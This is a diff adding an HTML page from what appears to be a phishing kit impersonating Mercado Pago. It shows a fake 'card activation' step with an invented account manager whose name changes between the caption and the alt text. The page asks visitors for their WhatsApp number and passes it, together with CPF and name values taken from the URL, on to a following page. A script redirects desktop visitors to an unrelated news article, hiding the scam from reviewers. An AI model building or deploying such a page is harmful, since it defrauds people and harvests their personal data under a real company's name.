@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Sua Gerente - mercado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        /* Animated Background Elements */
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: #FFE600;
+        }
+        .decoration1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+        .decoration2 {
+            width: 200px;
+            height: 200px;
+            bottom: 10%;
+            left: 5%;
+            background: #3483FA;
+            animation: float2 25s infinite ease-in-out;
+        }
+        .decoration3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 50%;
+            background: #3483FA;
+            animation: float3 30s infinite ease-in-out;
+        }
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-30px, 30px) scale(1.1); }
+        }
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(0.9); }
+        }
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+        /* Header */
+        .header {
+            background: #FFE600;
+            padding: 20px 24px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.6s ease-out;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        /* Logo */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        /* Content Container */
+        .content-container {
+            max-width: 520px;
+            margin: 30px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: scaleIn 0.6s ease-out;
+            position: relative;
+            text-align: center;
+        }
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        /* Title */
+        .main-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #333333;
+            line-height: 1.3;
+            margin-bottom: 20px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #666666;
+            line-height: 1.5;
+            margin-bottom: 40px;
+            animation: fadeIn 0.6s ease-out 0.2s both;
+        }
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        /* Manager Card */
+        .manager-card {
+            background: linear-gradient(135deg, rgba(52, 131, 250, 0.08) 0%, rgba(52, 131, 250, 0.03) 100%);
+            border: 1px solid #EDEDED;
+            border-radius: 12px;
+            padding: 30px 25px;
+            margin: 30px 0;
+            position: relative;
+            animation: cardReveal 0.8s ease-out 0.4s both;
+            overflow: hidden;
+        }
+        .manager-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 50% 50%, rgba(52, 131, 250, 0.08) 0%, transparent 70%);
+        }
+        @keyframes cardReveal {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .quote-mark {
+            position: absolute;
+            top: 15px;
+            left: 25px;
+            font-size: 40px;
+            color: #3483FA;
+            font-weight: 700;
+            opacity: 0.7;
+        }
+        .manager-photo {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            border: 4px solid #3483FA;
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.3);
+            position: relative;
+            z-index: 1;
+            animation: photoAppear 0.8s ease-out 0.6s both;
+        }
+        @keyframes photoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .manager-role {
+            font-size: 14px;
+            color: #666666;
+            font-weight: 500;
+            margin-bottom: 5px;
+            position: relative;
+            z-index: 1;
+        }
+        .manager-name {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        .manager-badge {
+            background: #3483FA;
+            color: #FFFFFF;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 13px;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 4px 12px rgba(52, 131, 250, 0.3);
+        }
+        .manager-badge::before {
+            content: '🏆';
+            font-size: 14px;
+        }
+        /* WhatsApp Section */
+        .whatsapp-container {
+            margin: 30px 0;
+            animation: fadeIn 0.8s ease-out 0.8s both;
+        }
+        .whatsapp-title {
+            font-size: 15px;
+            color: #666666;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .manager-contact {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+            padding: 15px;
+        }
+        .manager-contact input {
+            border: none;
+            border-bottom: 2px solid #3483FA;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+            font-size: 16px;
+            width: 70%;
+            padding: 5px;
+        }
+        .manager-contact input:focus {
+            border-bottom-color: #2968C8;
+        }
+        /* Continue Button */
+        .button {
+            background: #3483FA;
+            color: #FFFFFF;
+            padding: 18px 45px;
+            border-radius: 6px;
+            text-decoration: none;
+            display: block;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(52, 131, 250, 0.3);
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+            animation: fadeIn 0.8s ease-out 1s both;
+        }
+        .button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.4);
+            background: #2968C8;
+        }
+        .button:hover::before {
+            left: 100%;
+        }
+        .button:active {
+            transform: translateY(0);
+        }
+        /* Footer */
+        footer {
+            padding: 20px;
+            text-align: center;
+            background: #FFFFFF;
+            margin-top: auto;
+        }
+        footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+        footer a {
+            color: #3483FA;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        /* Mobile Responsive */
+        @media (max-width: 500px) {
+            .content-container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+            .main-title {
+                font-size: 24px;
+            }
+            .header {
+                padding: 18px 20px;
+            }
+            .logo-container img {
+                height: 40px;
+            }
+            .button {
+                padding: 16px 35px;
+                font-size: 15px;
+            }
+            .manager-photo {
+                width: 100px;
+                height: 100px;
+            }
+            .manager-name {
+                font-size: 20px;
+            }
+        }
+    </style>
+
+    <!-- Pixel Facebook 1 -->
+    <script>
+        window.pixelId = "6a184246f1f2699f88b3ab4b";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel UTMify -->
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+    <!-- Pixel Facebook 2 -->
+    <script>
+        window.pixelId = "699511958e254c5ebc775636";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel Google (adicionado sem interferir nos pixels existentes) -->
+    <script>
+        window.googlePixelId = "6a1ecf677f95f02e48c8cff3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script type="text/javascript">
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://mundologistica.com.br/noticias/shopee-amplia-entregas-com-mais-de-2-mil-pontos-de-retirada');
+        }
+    </script>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="https://i.postimg.cc/jS6Z8kTp/logo.png" alt="mercado">
+        </div>
+    </div>
+    <div class="content-container">
+        <h1 class="main-title">Ótimo, quase lá!</h1>
+        <p class="subtitle">Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!</p>
+        
+        <div class="manager-card">
+            <div class="quote-mark">"</div>
+            <img src="https://i.postimg.cc/SRpG7W5b/gerente.webp" alt="Gerente Daniela Barros" class="manager-photo">
+            <div class="manager-role">Gerente</div>
+            <div class="manager-name">Geovana Lima</div>
+            <div class="manager-badge">Melhor gerente 2023-2025</div>
+        </div>
+        
+        <div class="whatsapp-container">
+            <div class="manager-contact">
+                <i class="fab fa-whatsapp" style="color: #25D366; margin-right: 10px; font-size: 20px;"></i>
+                <input type="tel" id="whatsapp" name="whatsapp" placeholder="Digite seu WhatsApp" maxlength="15">
+            </div>
+        </div>
+        
+        <button class="button" onclick="continuarFluxo()">Continuar</button>
+    </div>
+    
+    <footer>
+        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
+        <p>CNPJ: 10.573.521/0001-91 · <a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </footer>
+    
+    <script>
+        // =======================================================
+        // SISTEMA SIMPLIFICADO DE PARÂMETROS URL
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL com parâmetros (incluindo dados adicionais)
+        function buildUrlWithParams(baseUrl, additionalParams = {}) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            // Adicionar parâmetros originais da URL
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            // Adicionar parâmetros adicionais (WhatsApp)
+            Object.keys(additionalParams).forEach(key => {
+                if (additionalParams[key]) {
+                    url.searchParams.append(key, additionalParams[key]);
+                }
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros atuais no console
+        console.log('Parâmetros atuais da página 5:', getUrlParams());
+
+        // =======================================================
+        // SISTEMA DE DADOS DO USUÁRIO
+        // =======================================================
+        
+        const UserData = {
+            userData: {},
+            
+            // Carrega dados do localStorage
+            load: function() {
+                try {
+                    const data = localStorage.getItem('userData');
+                    if (data) {
+                        this.userData = JSON.parse(data);
+                        console.log('Dados carregados do localStorage:', this.userData);
+                    }
+                    return this.userData;
+                } catch (error) {
+                    console.error('Erro ao carregar dados:', error);
+                    this.userData = {};
+                    return this.userData;
+                }
+            },
+            
+            // Salva dados no localStorage
+            save: function(dados) {
+                this.userData = { ...this.userData, ...dados };
+                try {
+                    localStorage.setItem('userData', JSON.stringify(this.userData));
+                    console.log('Dados salvos no localStorage:', this.userData);
+                } catch (error) {
+                    console.error('Erro ao salvar dados:', error);
+                }
+            },
+            
+            // Atualiza dados existentes
+            update: function(novosDados) {
+                this.userData = { ...this.userData, ...novosDados };
+                this.save(this.userData);
+                console.log('Dados atualizados:', this.userData);
+                return this.userData;
+            },
+            
+            // Limpa todos os dados
+            clear: function() {
+                this.userData = {};
+                localStorage.removeItem('userData');
+                console.log('Dados limpos');
+            }
+        };
+
+        // Aplicar máscara de telefone em tempo real
+        document.getElementById('whatsapp').addEventListener('input', function(e) {
+            mascaraTelefone(e.target);
+        });
+
+        // Função de máscara para telefone
+        function mascaraTelefone(campo) {
+            let value = campo.value.replace(/\D/g, '');
+            if (value.length <= 11) {
+                if (value.length >= 7) {
+                    value = value.replace(/(\d{2})(\d{5})(\d{0,4})/, '($1) $2-$3');
+                } else if (value.length >= 3) {
+                    value = value.replace(/(\d{2})(\d{0,5})/, '($1) $2');
+                } else if (value.length >= 1) {
+                    value = value.replace(/(\d{0,2})/, '($1');
+                }
+                campo.value = value;
+            }
+        }
+
+        // =======================================================
+        // FUNÇÃO PRINCIPAL - PASSAR APENAS WHATSAPP
+        // =======================================================
+        
+        function continuarFluxo() {
+            const whatsappInput = document.getElementById('whatsapp');
+            const whatsapp = whatsappInput.value;
+            const whatsappLimpo = whatsapp.replace(/\D/g, '');
+            
+            if (whatsappLimpo.length < 10) {
+                alert('Por favor, digite seu WhatsApp antes de continuar');
+                whatsappInput.focus();
+                return;
+            }
+            
+            // Salva dados no localStorage para uso interno
+            UserData.update({
+                etapa_atual: 'gerente_apresentada',
+                gerente_apresentada: true,
+                gerente_data: new Date().toISOString(),
+                whatsapp: whatsappLimpo,
+                whatsapp_formatado: whatsapp,
+                gerente_nome: 'Daniela Barros',
+                gerente_role: 'Gerente',
+                ultima_atualizacao: new Date().toISOString()
+            });
+            
+            console.log('Dados salvos internamente:', UserData.load());
+            
+            // Prepara parâmetros para URL - APENAS WHATSAPP
+            const additionalParams = {
+                whatsapp: whatsappLimpo // Apenas WhatsApp sem formatação
+            };
+            
+            // Constrói a URL da próxima página
+            const proximaUrl = buildUrlWithParams('11.html', additionalParams);
+            console.log('Redirecionando para:', proximaUrl);
+            
+            // Redireciona para 11.html com todos os parâmetros + WhatsApp
+            window.location.href = proximaUrl;
+        }
+
+        // =======================================================
+        // INICIALIZAÇÃO
+        // =======================================================
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const dadosUsuario = UserData.load();
+            console.log('Dados do usuário carregados na inicialização:', dadosUsuario);
+
+            // Preenche o campo WhatsApp se já tiver dados salvos
+            if (dadosUsuario && dadosUsuario.whatsapp_formatado) {
+                document.getElementById('whatsapp').value = dadosUsuario.whatsapp_formatado;
+            }
+            
+            // Registra o acesso a esta página
+            UserData.update({
+                pagina_gerente_acesso: new Date().toISOString(),
+                user_agent: navigator.userAgent,
+                url_atual: window.location.href
+            });
+        });
+
+        // =======================================================
+        // FUNÇÃO HELPER PARA OUTRAS PÁGINAS
+        // =======================================================
+        
+        // Função helper para outras páginas recuperarem os dados da URL
+        window.getCustomerData = function() {
+            const params = getUrlParams();
+            return {
+                cpf: params.cpf || '',
+                nome: params.nome || '',
+                whatsapp: params.whatsapp || ''
+            };
+        };
+    </script>
+</body>
+</html>
